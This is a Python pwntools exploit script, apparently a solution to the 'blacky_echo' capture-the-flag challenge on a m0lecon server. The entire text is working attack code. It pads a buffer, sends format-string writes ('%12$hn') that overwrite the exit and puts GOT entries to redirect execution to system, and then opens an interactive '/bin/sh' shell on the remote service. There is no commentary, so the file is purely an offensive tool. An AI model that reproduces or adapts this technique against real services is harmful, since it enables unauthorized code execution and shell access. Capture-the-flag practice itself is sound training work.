from pwn import *

exit_got=0x602088
puts_got=0x602020
system_plt=0x400840
#context.log_level="error"


#p=process("./blacky_echo")
p=remote("challs.m0lecon.it",9011)
p.sendline("53674047")
payload=""
payload+="A"*(0x10010-6)
payload+="AAAAAAA"
payload+="%"+(str(2900-23-8-3-6+12))+"x"
payload+="%12$hn"
payload+=p64(exit_got)
print len(payload)-(0x10010-6)
p.sendline(payload)


p.sendline("53674047")
payload=""
payload+="A"*(0x10010-6)
payload+="AAAAAAA"
payload+="%"+(str(2112-23-8-3-6+12))+"x"
payload+="%12$hn"
payload+=p64(puts_got)
print len(payload)-(0x10010-6)

p.sendline(payload)

p.sendline("50")
p.sendline("ECHO->/bin/sh")

p.interactive()
